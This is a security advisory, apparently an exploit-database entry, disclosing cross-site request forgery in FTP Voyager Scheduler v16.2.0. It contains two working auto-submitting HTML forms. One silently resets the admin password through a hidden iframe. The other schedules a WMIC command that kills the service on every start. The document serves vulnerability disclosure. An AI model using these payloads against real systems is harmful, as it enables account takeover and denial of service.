@@ -1,0 +1,115 @@
+<!--
+[+] Credits: John Page AKA hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/FTP-VOYAGER-SCHEDULER-CSRF-REMOTE-CMD-EXECUTION.txt
+[+] ISR: ApparitionSec            
+ 
+
+Vendor:
+==============
+solarwinds.com
+www.serv-u.com
+
+
+Product:
+====================
+FTP Voyager Scheduler
+v16.2.0
+
+
+Vulnerability Type:
+=============================
+CSRF Remote Command Execution
+
+
+CVE Reference:
+==============
+N/A
+
+
+Security Issue:
+================
+Multiple cross site request forgeries exist in the Web Interface side of FTP Voyager Scheduler running on port 52986.
+Allowing remote attackers to make HTTP requests on behalf of an authenticated user if that user visits a malicious
+webpage or clicks an attacker supplied link. 
+
+FTP Voyager has a scheduler feature that lets users create tasks/commands to execute on some type of other action like
+when Directorys are created, files uploaded/downloader, Scheduler starts or stops and so forth. Remote attackers who
+successfully pull off CSRF exploitation can do things like change the Admin password or cause a persistent Denial of Service
+by setting the task to terminate "FTP Voyager Scheduler" itself upon startup among other nefarious things.
+
+
+Exploit/POC:
+=============
+
+Default login no password, then set a password in FTP Voyager Scheduler Web interface.
+
+Upon CSRF the user will get a HTTP Response will be like below, we can prevent user from seeing this message 
+targeting hidden iframe in webpage.
+
+<response><result>0</result><ResultText>Operation was successful.</ResultText><ObjectID>141175</ObjectID></response>
+
+
+1) Change Admin passwd 
+-->
+<iframe name="hideme" style="display:none" ></iframe>
+
+<form target="hideme" action="http://localhost:52986/Admin/XML/Result.xml?Command=UpdateObject&Object=CScheduler.0.Scheduler.0&StaticOnly=1&Sync=666" method="post">
+<input type="hidden" name="AdminPassword" value="PWN123">
+<input type="hidden" name="ConfirmAdminPassword" value="PWN123">
+<input type="hidden" name="RemoteAdmin" value="1">
+<input type="hidden" name="RemoteAdminPort" value="52986">
+<input type="hidden" name="RemoteAdminSSL" value="0">
+<script>document.forms[0].submit()</script>
+</form>
+
+
+2) Persistent Denial Of Service uses call to WMIC
+
+<form action="http://localhost:52986/Admin/XML/Result.xml?Command=AddObject&Object=CEventAttrs.0.FVSEvent&Sync=666" method="post">
+<input type="hidden" name="EventName" value="PWN">
+<input type="hidden" name="Description" value="Run Command!">
+<input type="hidden" name="Enabled" value="1">
+<input type="hidden" name="EventID" value="1"> <!-- Run on Scheduler Start event -->
+<input type="hidden" name="Action" value="2">
+<input type="hidden" name="multiselect_Action" value="2">
+<input type="hidden" name="EmailToAddress" value="evil@gods.abyss">
+<input type="hidden" name="EmailToAddressBCC" value="">
+<input type="hidden" name="ExeFilePath" value="C:\Windows\System32\wbem\WMIC.exe">
+<input type="hidden" name="ExecWaitSecs" value="5">
+<input type="hidden" name="Data1" value="process where name='FTP Voyager Scheduler.exe' call terminate">
+<input type="hidden" name="Data2" value="&">
+<script>document.forms[0].submit()</script>
+</form>
+
+
+<!--
+Network Access:
+===============
+Remote
+
+
+Severity:
+=========
+High
+
+
+Disclosure Timeline:
+=======================================
+Vendor Notification: November 30, 2016
+Result:  No Reply
+Second Notification Attempt: March 5, 2017
+Result: 
+March 9, 2017  : Public Disclosure
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c)
+
+hyp3rlinx
+-->
